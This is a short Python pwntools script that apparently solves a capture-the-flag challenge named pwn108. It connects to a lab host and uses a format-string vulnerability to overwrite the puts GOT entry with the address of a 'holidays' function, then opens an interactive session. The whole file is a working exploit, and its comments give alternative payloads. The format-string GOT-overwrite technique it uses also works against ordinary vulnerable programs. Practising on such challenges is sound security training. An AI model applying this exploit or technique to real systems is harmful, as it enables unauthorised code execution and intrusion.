from pwn import *


elf = ELF("pwn108.pwn108",checksec=False)
#printf_got = p64(0x404030)
#holiday_addr = p64(0x40123b)

#p = process('pwn108.pwn108')
p  = remote('10.10.217.213',9008)

puts_got = elf.got['puts']
holiday = elf.symbols['holidays']
offset = 6

log.info(f'PutsGOT: {hex(puts_got)}')
log.info(f'Holiday: {hex(holiday)}')

#Overwrite printf GOT with holiday address
#Payload structure
# first input -> puts_got
# second input -> % + holiday_as_integer + d%offset$lln
# or use this
# payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['holidays']})

#holiday_as_integer = b'4198971'

p.recvuntil(b'name]: ')
p.sendline(p64(puts_got))

p.recvuntil(b'No]: ')

#Send as string
p.sendline(b'%' + str(holiday).encode('UTF-8') + b's%6$lln')

#Send as integer
#p.sendline(b'%' + holiday_as_integer + b'd%6$lln')

p.interactive()